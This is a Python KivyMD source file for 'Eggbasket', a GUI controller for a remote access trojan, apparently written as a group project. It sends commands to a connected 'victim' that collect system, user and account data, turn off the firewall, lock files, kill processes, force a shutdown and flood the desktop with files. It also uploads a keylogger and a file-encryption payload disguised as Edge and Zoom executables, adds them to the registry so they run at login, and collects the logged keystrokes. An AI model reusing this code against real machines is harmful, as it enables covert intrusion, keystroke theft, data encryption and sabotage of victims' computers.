import os
import socket
import threading
import sys
import time

import kivy
import kivymd
from kivymd.app import MDApp
from kivy.lang import Builder
from kivymd.uix.screen import Screen
from kivymd.uix.dialog import MDDialog
from kivy.uix.boxlayout import BoxLayout
from kivymd.uix.button import MDFlatButton

KV = '''
ScreenManager:
    id: screenManager
    MDScreen:
        name: "startMenu"
        MDRectangleFlatButton:
            id: startBtn
            text: "Start Server"
            pos_hint: {"center_x": .5, "center_y": .5}
            opacity: 1
            disabled: False
            on_release: app.StartServer()

        MDLabel:
            id: statusLbl
            text: "Status"
            font_size: '22.5sp'
            halign: 'center'
            size_hint_y: None
            height: self.texture_size[1]
            pos_hint: {"center_x": .5, "center_y": .8}

    MDScreen:
        name: "mainMenu"            
        ScrollView:
            MDList:
                OneLineListItem:
                    id: networkInfoBtn
                    text: "Network Info"
                    on_release: app.NetworkInfo()

                OneLineListItem:
                    id: osInfoBtn
                    text: "OS Info"
                    on_release: app.OSInfo()

                OneLineListItem:
                    id: gpuInfoBtn
                    text: "GPU Info"
                    on_release: app.GpuInfo()

                OneLineListItem:
                    id: cpuBtn
                    text: "CPU Usage"
                    on_release: app.CpuUsage()

                OneLineListItem:
                    id: taskBtn
                    text: "Task List"
                    on_release: app.Tasks()

                OneLineListItem:
                    id: netserviceBtn
                    text: "Network Services"
                    on_release: app.Services()

                OneLineListItem:
                    id: secPolicy
                    text: "Security Policy"
                    on_release: app.SecPolicy()

                OneLineListItem:
                    id: memInfo
                    text: "Memory Information"
                    on_release: app.MemInfo()

                OneLineListItem:
                    id: userInfoBtn
                    text: "Current User Information"
                    on_release: app.UserInfo()

                OneLineListItem:
                    id: accountsBtn
                    text: "Accounts Information"
                    on_release: app.AccountInfo()

                OneLineListItem:
                    id: biosBtn
                    text: "BIOS Information"
                    on_release: app.BIOSInfo()

        MDTextField:
            id: consoleField
            max_height: '200dp'
            hint_text: 'Console'
            multiline: True

        MDIconButton:
            icon: "spider-thread"
            md_bg_color: 'red'
            pos_hint: {"center_x": .95, "center_y": .1} 
            elevation_normal: 12
            on_release: app.DisruptionMenu()

    MDScreen:
        name: "disruptionMenu"
        ScrollView:
            MDList:
                OneLineListItem:
                    id: killTaskBtn
                    text: "Kill Task"
                    on_release: app.KillTask()

                OneLineListItem:
                    id: shutDownBtn
                    text: "Shutdown"
                    on_release: app.Shutdown()

                OneLineListItem:
                    id: fileCreateBtn
                    text: "File Creation Disruption"
                    on_release: app.FileCreate()

                OneLineListItem:
                    id: firewallBtn
                    text: "Firewall"
                    on_release: app.Firewall()

                OneLineListItem:
                    id: denyFileBtn
                    text: "Deny Files"
                    on_release: app.DenyFiles()

                OneLineListItem:
                    id: openBrowser
                    text: "Open Browsers"
                    on_release: app.OpenBrowsers()

                OneLineListItem:
                    id: instkeyloggerBtn
                    text: "Install Key Logger"
                    on_release: app.KeyloggerInstall()

                OneLineListItem:
                    id: keyloggerBtn
                    text: "Key Logger Start"
                    on_release: app.KeyloggerInit()

                OneLineListItem:
                    id: keyloggerstopBtn
                    text: "Key Logger Stop"
                    on_release: app.KeyloggerStop()

                OneLineListItem:
                    id: encryptfilesBtn
                    text: "Encrypt Files"
                    on_release: app.EncryptFiles()

        MDTextField:
            id: disruptConsoleField
            max_height: '200dp'
            hint_text: 'Console'
            multiline: True

        MDIconButton:
            icon: "menu"
            md_bg_color: 'lightblue'
            pos_hint: {"center_x": .95, "center_y": .1} 
            elevation_normal: 12
            on_press: app.MainMenu()

<TaskKillContent>
    orientation: 'vertical'
    spacing: '12dp'
    size_hint_y: None
    height: '120dp'
    MDTextField:
        id: taskKillProcessID
        hint_text: 'Enter Process Name'
<DenyFilesContent>
    orientation: 'vertical'
    spacing: '12dp'
    size_hint_y: None
    height: '120dp'
    MDTextField:
        id: denyFilesID
        hint_text: 'Enter File Path'
'''

# Server IP and Port
HOST = '127.0.0.1'
PORT = 21420


class Main(MDApp):
    def build(self):
        self.title = 'Eggbasket'
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "BlueGray"

        return Builder.load_string(KV)

    def StartServer(self):
        # Start server with the given host and port given and listen for a client
        self.server = socket.socket()
        self.server.bind((HOST, PORT))
        self.root.ids.statusLbl.text = 'Server started!'
        # print('Server started!')

        # A max of one client can be listend at a time
        self.server.listen(3)
        self.root.ids.statusLbl.text = 'Listening for a client connection to be established...'
        # print('Listening for a client connection to be established...')
        self.root.ids.startBtn.disabled = True
        self.root.ids.startBtn.opacity = 0
        threading.Thread(target=self.MainLoop).start()

    def MainLoop(self):
        while True:
            # Check whether connection is established
            self.currConn = self.server.accept()[0]
            self.root.ids.statusLbl.text = 'A client connected!'
            self.root.current = "mainMenu"
            print('A client has established connection!')

            self.exitKeyLogger = threading.Event()

    # Juls shizzle
    # This is to gather the client's information about their network
    def NetworkInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get IPconfig Information
            command = 'ipconfig /all'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Gather Operating System Information
    def OSInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get Host/Machine Name
            command = 'systeminfo | findstr /C:"Host Name"'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Get OS Information
            command = 'systeminfo | findstr /C:"OS"'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize2 = self.currConn.recv(1024).decode()
            output2 = self.currConn.recv(int(recvsize2)).decode()

            # Get Processor Information
            command = 'wmic path win32_Processor get Name,NumberOfCores,NumberOfLogicalProcessors'
            self.currConn.send(command.encode())
            recvsize3 = self.currConn.recv(1024).decode()
            output3 = self.currConn.recv(int(recvsize3)).decode()

            # Print results
            print('Output:')
            print(output)
            print(output2)
            print(output3)

            self.root.ids.consoleField.text = output + output2 + output3
            break

    # Gather information about the graphics card
    def GpuInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get GPU Name, Description & Version
            command = 'wmic path win32_VideoController get name,Description,DriverVersion'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Print results
            print('Output:')
            print(output)

            self.root.ids.consoleField.text = output
            break

    # Zees stuff
    # Get the % of CPU Utilization
    def CpuUsage(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get CPU Load Percentage
            command = 'wmic cpu get loadpercentage'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get current running tasks
    def Tasks(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get List of Task
            command = 'tasklist'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get current running services
    def Services(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get list of services
            command = 'net start'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get security policy
    def SecPolicy(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get list of security policy
            command = 'net accounts'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get memory information
    def MemInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Memory status
            command = 'wmic MEMORYCHIP get BankLabel, DeviceLocator, Capacity, Speed'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Available memory
            command = 'systeminfo | findstr /C:"Available Physical Memory"'
            self.currConn.send(command.encode())
            recvsize2 = self.currConn.recv(1024).decode()
            output2 = self.currConn.recv(int(recvsize2)).decode()

            # Cache
            command = 'wmic cpu get L2CacheSize, L3CacheSize'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize3 = self.currConn.recv(1024).decode()
            output3 = self.currConn.recv(int(recvsize3)).decode()

            # Print result
            print('Output:')
            print(output)
            print(output2)
            print(output3)

            self.root.ids.consoleField.text = output + output2 + output3
            break

    # Fang's stuffz
    # Get user info of the system
    def UserInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get Username, Fullname, Last Login
            command = 'net user "%USERNAME%"'
            self.currConn.send(command.encode())
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Get SID
            command = 'wmic useraccount where name="%USERNAME%" get sid'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize2 = self.currConn.recv(1024).decode()
            output2 = self.currConn.recv(int(recvsize2)).decode()
            output2 = output2.splitlines()

            # Print results
            print('Output: \n')
            print(output)
            a2 = f"SID\t\t\t\t\t\t\t{output2[2]}"
            print(a2)

            self.root.ids.consoleField.text = str(output + a2)
            break

    # Get User Account Info
    def AccountInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            command = 'wmic useraccount get domain,name,sid,status,passwordchangeable,passwordexpires,passwordrequired,localaccount'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            print('Output: \n', output)
            self.root.ids.consoleField.text = output
            break

    # Get BIOS information of Motherboard
    def BIOSInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            command = 'wmic bios get manufacturer,name,primarybios,serialnumber,version,smbiospresent,status'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            print('Output: \n', output)
            self.root.ids.consoleField.text = output
            break

    ###############################DISRUPTIONS############################################
    # Juls Simple Disruption
    # Disable Firewall Disruption
    def Firewall(self):
        while True:
            # Reset console
            self.root.ids.disruptConsoleField.text = ''

            command = "netsh advfirewall set allprofiles state off"
            self.currConn.send(command.encode())
            print('[+] Command sent')
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Print Results
            print(f"Output: {output}")
            self.root.ids.disruptConsoleField.text = output
            break

    # Prevent access to file
    def DenyFiles(self):
        # Reset console
        self.root.ids.disruptConsoleField.text = ''

        self.denyFilesDialog = MDDialog(
            title="File Path:",
            type="custom",
            content_cls=DenyFilesContent(),
            buttons=[
                MDFlatButton(
                    text="CANCEL", on_press=lambda x: self.DismissDenyFilesDialog()
                ),
                MDFlatButton(
                    text="OK", on_press=lambda x: self.ExecuteDenyFiles()
                ),
            ],
        )

        self.denyFilesDialog.open()

    def DismissDenyFilesDialog(self, *args):
        self.denyFilesDialog.dismiss(force=True)

    def ExecuteDenyFiles(self):
        while True:
            command = 'cacls ' + self.denyFilesDialog.content_cls.ids.denyFilesID.text + ' /E /P everyone:n'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Print Results
            print('Output: ', output)
            self.root.ids.disruptConsoleField.text = output
            self.denyFilesDialog.dismiss(force=True)
            break

    # Juls Severe Disruption
    # Open many browsers
    def OpenBrowsers(self):
        while True:
            # Reset console
            self.root.ids.disruptConsoleField.text = ''

            # Change to () for infinite loop
            command = 'FOR /L %A IN (1 1 10) DO (start msedge)'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Print Results
            print('Output: ', output)
            self.root.ids.disruptConsoleField.text = output
            break

    # Zees Severe Disruption
    # File Creation Disruption
    def FileCreate(self):
        while True:
            # Reset console
            self.root.ids.disruptConsoleField.text = ''

            # Replace 20 with a larger number for actual attack
            command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_got_hacked_by_eggs_%A.txt)'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Print Results
            print('Output: ', output)
            self.root.ids.disruptConsoleField.text = output
            break

    # Zees Simple Disruptions
    # Shutdown Disruption
    def Shutdown(self):
        while True:
            # Reset console
            self.root.ids.disruptConsoleField.text = ''

            # /t is Timer
            command = 'shutdown /s /t 00'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Print Results
            print('Output: ', output)
            self.root.ids.disruptConsoleField.text = output
            break

    # Kill Task Disruption
    def KillTask(self):
        # Reset console
        self.root.ids.disruptConsoleField.text = ''

        self.killTaskDialog = MDDialog(
            title="Task Kill:",
            type="custom",
            content_cls=TaskKillContent(),
            buttons=[
                MDFlatButton(
                    text="CANCEL", on_press=lambda x: self.DismissKillTaskDialog()
                ),
                MDFlatButton(
                    text="OK", on_press=lambda x: self.ExecuteKillTask()
                ),
            ],
        )

        self.killTaskDialog.open()

    def DismissKillTaskDialog(self, *args):
        self.killTaskDialog.dismiss(force=True)

    def ExecuteKillTask(self):
        while True:
            command = 'taskkill /im ' + self.killTaskDialog.content_cls.ids.taskKillProcessID.text + ' /F'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Print Results
            print('Output: ', output)
            self.root.ids.disruptConsoleField.text = output
            self.killTaskDialog.dismiss(force=True)
            break

    # Fang's keylogging madness
    def KeyloggerInstall(self):
        # Reset console
        self.root.ids.disruptConsoleField.text = ''

        tpath = "%USERPROFILE%\\AppData\\Local\\Microsoft\\msedgeeee.exe"
        kpath = os.path.join(os.getcwd(), "keylogger.exe")
        while True:
            # Check if payload is already on the target machine
            command = f'if exist {tpath.rstrip()} (echo True) else (echo False)'
            self.currConn.send(command.encode())
            recvsize = self.currConn.recv(1024).decode()
            isExist = self.currConn.recv(int(recvsize)).decode()

            # Send payload to target if it isn't there yet
            if isExist.strip() == "False":
                sendprompt = "\nSending keylogger payload to victim."
                print(sendprompt)
                self.root.ids.disruptConsoleField.text += sendprompt

                # File transfer mode
                self.currConn.send("ft_True".encode())
                time.sleep(0.5)

                # Send target path and size of file
                self.currConn.send(str("echo " + tpath).encode())
                self.currConn.send(str(os.path.getsize(kpath)).encode())
                time.sleep(1)

                # Send exe in packets with size 8192
                f = open(kpath, 'rb')
                bytesToSend = f.read(8192)
                self.currConn.send(bytesToSend)
                totalSent = len(bytesToSend)
                while totalSent < os.path.getsize(kpath):
                    bytesToSend = f.read(8192)
                    totalSent = totalSent + len(bytesToSend)
                    self.currConn.send(bytesToSend)
                f.close()
                dlcomplete = str("\n[VICTIM]: " + self.currConn.recv(1024).decode())
                print(dlcomplete)
                self.root.ids.disruptConsoleField.text += dlcomplete
                time.sleep(0.05)

                # Add payload to registry to run on login
                command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Microsoft Edge" /t REG_SZ /d "{tpath}" /f'
                self.currConn.send(command.encode())
                comsent2 = str('\nCommand sent to client: ' + command)
                print(comsent2)
                self.root.ids.disruptConsoleField.text += comsent2
                recvsize = self.currConn.recv(1024).decode()
                output = self.currConn.recv(int(recvsize)).decode()
                output = str('\nRegistry add: ' + output)
                print(output)
                self.root.ids.disruptConsoleField.text += output

                # Run payload once
                time.sleep(0.05)
                self.currConn.send("exe_True".encode())
                command = tpath
                self.currConn.send(command.encode())
                comsent3 = str('\nCommand sent to client: ' + command)
                print(comsent3)
                self.root.ids.disruptConsoleField.text += comsent3
                output2 = self.currConn.recv(1024).decode()
                time.sleep(5)
                o1 = f"\nKeylogger{output2}"
                print(o1)
                self.root.ids.disruptConsoleField.text += o1
            else:
                o2 = "\nKeylogger already installed on target machine."
                print(o2)
                self.root.ids.disruptConsoleField.text += o2
            break

    def KeyloggerInit(self):
        threading.Thread(target=self.Keylogger).start()  # figure out how to kill thread

    def KeyloggerStop(self):
        self.exitKeyLogger.set()

    def Keylogger(self):
        try:
            self.exitKeyLogger.clear()
            self.root.ids.disruptConsoleField.text = ''
            # Connect to keylogger on port 47620
            klserver = socket.socket()
            klserver.bind((HOST, 47620))
            klserver.listen()
            print("Waiting for victim to transmit keylog info.")
            conn, addr = klserver.accept()
            print(f"Connection from {addr} established!")
            while True:
                if not self.exitKeyLogger.isSet():
                    keys = conn.recv(1024).decode()
                    print(keys)
                    self.root.ids.disruptConsoleField.text += str(", " + keys)
                else:
                    break
            conn.close()
            print("Connection Closed.")

        except:
            pass

    def EncryptFiles(self):
        # Reset console
        self.root.ids.disruptConsoleField.text = ''

        tpath = "%USERPROFILE%\\AppData\\Local\\Temp\\zooooom.exe"
        kpath = os.path.join(os.getcwd(), "encrypt.exe")
        while True:
            # Check if payload is already on the target machine
            command = f'if exist {tpath.rstrip()} (echo True) else (echo False)'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            isExist = self.currConn.recv(int(recvsize)).decode()

            # Send payload to target if it isn't there yet
            if isExist.strip() == "False":
                encprompt = "\nSending encrypt file payload to victim."
                print(encprompt)
                self.root.ids.disruptConsoleField.text += encprompt

                # File transfer mode
                self.currConn.send("ft_True".encode())
                time.sleep(0.5)

                # Send target path and size of file
                self.currConn.send(str("echo " + tpath).encode())
                self.currConn.send(str(os.path.getsize(kpath)).encode())
                time.sleep(1)

                # Send exe in packets with size 8192
                f = open(kpath, 'rb')
                bytesToSend = f.read(8192)
                self.currConn.send(bytesToSend)
                totalSent = len(bytesToSend)
                while totalSent < os.path.getsize(kpath):
                    bytesToSend = f.read(8192)
                    totalSent = totalSent + len(bytesToSend)
                    self.currConn.send(bytesToSend)
                f.close()
                dlcomplete = str("\n[VICTIM]: " + self.currConn.recv(1024).decode())
                print(dlcomplete)
                self.root.ids.disruptConsoleField.text += dlcomplete
                time.sleep(0.05)

                # Add payload to registry to run on login
                command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Zoom" /t REG_SZ /d "{tpath}" /f'
                self.currConn.send(command.encode())
                comsent = ('\nCommand sent to client: ' + command)
                print(comsent)
                self.root.ids.disruptConsoleField.text += comsent
                recvsize = self.currConn.recv(1024).decode()
                output = self.currConn.recv(int(recvsize)).decode()
                output = str('\nRegistry add: ' + output)
                print(output)
                self.root.ids.disruptConsoleField.text += output

                # Run payload once
                time.sleep(0.05)
                self.currConn.send("exe_True".encode())
                command = tpath
                self.currConn.send(command.encode())
                comsent2 = ('\nCommand sent to client: ' + command)
                print(comsent2)
                self.root.ids.disruptConsoleField.text += comsent2
                output2 = self.currConn.recv(1024).decode()
                time.sleep(5)
                o1 = f"\nEncryptFile{output2}"
                print(o1)
                self.root.ids.disruptConsoleField.text += o1
            else:
                o2 = "\nEncryptFile already installed on target machine."
                print(o2)
                self.root.ids.disruptConsoleField.text += o2
            break

    # UI Dependencies for changing menus
    def DisruptionMenu(self):
        self.root.current = "disruptionMenu"

    def MainMenu(self):
        self.root.current = "mainMenu"


# UI Dependencies for Dialog Box
class DenyFilesContent(BoxLayout):
    pass


class TaskKillContent(BoxLayout):
    pass


if __name__ == '__main__':
    Main().run()
